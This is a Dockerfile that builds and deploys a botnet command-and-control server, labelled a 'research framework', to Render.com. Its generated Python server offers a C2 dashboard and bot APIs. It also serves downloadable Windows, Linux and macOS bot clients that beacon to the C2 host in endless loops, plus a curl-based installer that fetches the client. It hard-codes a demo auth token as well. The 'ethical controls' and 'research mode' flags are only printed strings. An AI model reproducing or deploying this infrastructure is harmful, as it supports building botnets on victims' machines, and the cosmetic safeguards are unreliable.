# Simplified Dockerfile for Render.com Deployment
# Advanced Botnet Research Framework

FROM python:3.9-slim

# Install system dependencies
RUN apt-get update && apt-get install -y \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Create application directory
WORKDIR /app

# Create web directory
RUN mkdir -p /app/web

# Copy web dashboard files if they exist
COPY c2-server/web-dashboard/ /app/web/

# Create comprehensive Python server with dashboard API and client downloads
RUN echo 'import http.server' > /app/server.py
RUN echo 'import socketserver' >> /app/server.py
RUN echo 'import json' >> /app/server.py
RUN echo 'import os' >> /app/server.py
RUN echo 'import urllib.parse' >> /app/server.py
RUN echo 'from datetime import datetime' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo 'class Handler(http.server.SimpleHTTPRequestHandler):' >> /app/server.py
RUN echo '    def __init__(self, *args, **kwargs):' >> /app/server.py
RUN echo '        super().__init__(*args, directory="/app/web", **kwargs)' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '    def do_GET(self):' >> /app/server.py
RUN echo '        if self.path == "/health":' >> /app/server.py
RUN echo '            self.send_json({"status": "healthy", "mode": "research", "timestamp": datetime.now().isoformat()})' >> /app/server.py
RUN echo '        elif self.path == "/api/status":' >> /app/server.py
RUN echo '            self.send_json({"framework": "Advanced Botnet Research Framework", "version": "1.0.0", "mode": "RESEARCH", "status": "operational", "research_mode": True, "ethical_controls": "STRICT"})' >> /app/server.py
RUN echo '        elif self.path == "/api/server/info":' >> /app/server.py
RUN echo '            self.send_json({"research_mode": True, "version": "1.0.0", "status": "operational"})' >> /app/server.py
RUN echo '        elif self.path == "/api/statistics":' >> /app/server.py
RUN echo '            self.send_json({"active_bots": 0, "commands_today": 0, "bytes_transferred": 0, "server_start_time": datetime.now().isoformat()})' >> /app/server.py
RUN echo '        elif self.path == "/api/bots":' >> /app/server.py
RUN echo '            self.send_json([])' >> /app/server.py
RUN echo '        elif self.path == "/api/activity/recent":' >> /app/server.py
RUN echo '            self.send_json([{"timestamp": datetime.now().isoformat(), "type": "INFO", "description": "Server started in research mode"}])' >> /app/server.py
RUN echo '        elif self.path == "/api/commands/pending":' >> /app/server.py
RUN echo '            self.send_json([])' >> /app/server.py
RUN echo '        elif self.path == "/api/logs":' >> /app/server.py
RUN echo '            self.send_json({"logs": ["Server started in research mode", "Ethical controls activated", "Compliance monitoring enabled"], "count": 3})' >> /app/server.py
RUN echo '        elif self.path == "/api/research":' >> /app/server.py
RUN echo '            self.send_json({"session_id": os.environ.get("RESEARCH_SESSION_ID", "cloud_demo"), "compliance": "active", "ethical_mode": True})' >> /app/server.py
RUN echo '        elif self.path.startswith("/download/"):' >> /app/server.py
RUN echo '            self.handle_client_download()' >> /app/server.py
RUN echo '        elif self.path == "/install":' >> /app/server.py
RUN echo '            self.send_install_script()' >> /app/server.py
RUN echo '        elif self.path == "/builder":' >> /app/server.py
RUN echo '            self.path = "/builder.html"' >> /app/server.py
RUN echo '            super().do_GET()' >> /app/server.py
RUN echo '        elif self.path == "/":' >> /app/server.py
RUN echo '            self.path = "/index.html"' >> /app/server.py
RUN echo '            super().do_GET()' >> /app/server.py
RUN echo '        else:' >> /app/server.py
RUN echo '            super().do_GET()' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '    def handle_client_download(self):' >> /app/server.py
RUN echo '        platform = self.path.split("/")[-1]' >> /app/server.py
RUN echo '        if platform == "client-windows.exe":' >> /app/server.py
RUN echo '            self.send_client_script("windows")' >> /app/server.py
RUN echo '        elif platform == "client-linux":' >> /app/server.py
RUN echo '            self.send_client_script("linux")' >> /app/server.py
RUN echo '        elif platform == "client-macos":' >> /app/server.py
RUN echo '            self.send_client_script("macos")' >> /app/server.py
RUN echo '        else:' >> /app/server.py
RUN echo '            self.send_error(404)' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '    def send_client_script(self, platform):' >> /app/server.py
RUN echo '        server_url = f"https://{self.headers.get('"'"'Host'"'"', '"'"'localhost:8080'"'"')}/"' >> /app/server.py
RUN echo '        if platform == "windows":' >> /app/server.py
RUN echo '            script = f"""@echo off' >> /app/server.py
RUN echo 'echo Advanced Botnet Research Framework - Windows Client' >> /app/server.py
RUN echo 'echo Server: {server_url}' >> /app/server.py
RUN echo 'echo Research Mode: ENABLED' >> /app/server.py
RUN echo 'echo.' >> /app/server.py
RUN echo 'echo Connecting to C2 server...' >> /app/server.py
RUN echo 'powershell -Command "while ($true) { try { Invoke-RestMethod -Uri '"'"'{server_url}health'"'"' | Out-Null; Write-Host '"'"'[Connected] Bot active - Research mode'"'"'; Start-Sleep 30 } catch { Write-Host '"'"'[Reconnecting] Attempting connection...'"'"'; Start-Sleep 10 } }"' >> /app/server.py
RUN echo '"""' >> /app/server.py
RUN echo '            self.send_response(200)' >> /app/server.py
RUN echo '            self.send_header("Content-Type", "application/octet-stream")' >> /app/server.py
RUN echo '            self.send_header("Content-Disposition", "attachment; filename=bot-client.bat")' >> /app/server.py
RUN echo '        else:' >> /app/server.py
RUN echo '            script = f"""#!/bin/bash' >> /app/server.py
RUN echo 'echo "Advanced Botnet Research Framework - {platform.title()} Client"' >> /app/server.py
RUN echo 'echo "Server: {server_url}"' >> /app/server.py
RUN echo 'echo "Research Mode: ENABLED"' >> /app/server.py
RUN echo 'echo ""' >> /app/server.py
RUN echo 'echo "Connecting to C2 server..."' >> /app/server.py
RUN echo 'while true; do' >> /app/server.py
RUN echo '  if curl -s "{server_url}health" > /dev/null 2>&1; then' >> /app/server.py
RUN echo '    echo "[Connected] Bot active - Research mode"' >> /app/server.py
RUN echo '    sleep 30' >> /app/server.py
RUN echo '  else' >> /app/server.py
RUN echo '    echo "[Reconnecting] Attempting connection..."' >> /app/server.py
RUN echo '    sleep 10' >> /app/server.py
RUN echo '  fi' >> /app/server.py
RUN echo 'done' >> /app/server.py
RUN echo '"""' >> /app/server.py
RUN echo '            self.send_response(200)' >> /app/server.py
RUN echo '            self.send_header("Content-Type", "application/octet-stream")' >> /app/server.py
RUN echo '            self.send_header("Content-Disposition", f"attachment; filename=bot-client")' >> /app/server.py
RUN echo '        self.end_headers()' >> /app/server.py
RUN echo '        self.wfile.write(script.encode())' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '    def send_install_script(self):' >> /app/server.py
RUN echo '        server_url = f"https://{self.headers.get('"'"'Host'"'"', '"'"'localhost:8080'"'"')}/"' >> /app/server.py
RUN echo '        script = f"""#!/bin/bash' >> /app/server.py
RUN echo 'echo "🔬 Advanced Botnet Research Framework - Auto Installer"' >> /app/server.py
RUN echo 'echo "Server: {server_url}"' >> /app/server.py
RUN echo 'echo "⚖️  Research Mode: ENABLED"' >> /app/server.py
RUN echo 'echo ""' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '# Detect platform' >> /app/server.py
RUN echo 'if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then' >> /app/server.py
RUN echo '  PLATFORM="windows"' >> /app/server.py
RUN echo '  EXT=".exe"' >> /app/server.py
RUN echo 'elif [[ "$OSTYPE" == "darwin"* ]]; then' >> /app/server.py
RUN echo '  PLATFORM="macos"' >> /app/server.py
RUN echo '  EXT=""' >> /app/server.py
RUN echo 'else' >> /app/server.py
RUN echo '  PLATFORM="linux"' >> /app/server.py
RUN echo '  EXT=""' >> /app/server.py
RUN echo 'fi' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo 'echo "Detected platform: $PLATFORM"' >> /app/server.py
RUN echo 'echo "Downloading client..."' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '# Download and run client' >> /app/server.py
RUN echo 'curl -L "{server_url}download/client-$PLATFORM$EXT" -o "bot-client$EXT"' >> /app/server.py
RUN echo 'chmod +x "bot-client$EXT"' >> /app/server.py
RUN echo 'echo "✅ Client downloaded and ready!"' >> /app/server.py
RUN echo 'echo "Run: ./bot-client$EXT"' >> /app/server.py
RUN echo '"""' >> /app/server.py
RUN echo '        self.send_response(200)' >> /app/server.py
RUN echo '        self.send_header("Content-Type", "text/plain")' >> /app/server.py
RUN echo '        self.end_headers()' >> /app/server.py
RUN echo '        self.wfile.write(script.encode())' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo '    def send_json(self, data):' >> /app/server.py
RUN echo '        self.send_response(200)' >> /app/server.py
RUN echo '        self.send_header("Content-type", "application/json")' >> /app/server.py
RUN echo '        self.send_header("Access-Control-Allow-Origin", "*")' >> /app/server.py
RUN echo '        self.end_headers()' >> /app/server.py
RUN echo '        self.wfile.write(json.dumps(data).encode())' >> /app/server.py
RUN echo '' >> /app/server.py
RUN echo 'PORT = int(os.environ.get("PORT", 8080))' >> /app/server.py
RUN echo 'print("🔬 Advanced Botnet Research Framework")' >> /app/server.py
RUN echo 'print(f"🌐 Starting C2 Dashboard on port {PORT}")' >> /app/server.py
RUN echo 'print("⚖️  Research Mode: ENABLED")' >> /app/server.py
RUN echo 'print("🔒 Ethical Controls: STRICT")' >> /app/server.py
RUN echo 'print("📁 Serving dashboard from: /app/web")' >> /app/server.py
RUN echo 'with socketserver.TCPServer(("", PORT), Handler) as httpd:' >> /app/server.py
RUN echo '    httpd.serve_forever()' >> /app/server.py

# Create demo authentication token in localStorage via a simple JS injection
RUN echo 'document.addEventListener("DOMContentLoaded", function() {' > /app/web/auth-demo.js
RUN echo '  if (!localStorage.getItem("c2_auth_token")) {' >> /app/web/auth-demo.js
RUN echo '    localStorage.setItem("c2_auth_token", "demo_token_research_mode");' >> /app/web/auth-demo.js
RUN echo '  }' >> /app/web/auth-demo.js
RUN echo '});' >> /app/web/auth-demo.js

# Add authentication script to index.html for demo mode
RUN sed -i 's|<script src="js/dashboard.js"></script>|<script src="auth-demo.js"></script>\n    <script src="js/dashboard.js"></script>|' /app/web/index.html

# Environment variables
ENV RESEARCH_MODE=true
ENV ETHICAL_CONTROLS=strict

# Expose port
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=30s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# Start the server
CMD ["python3", "/app/server.py"]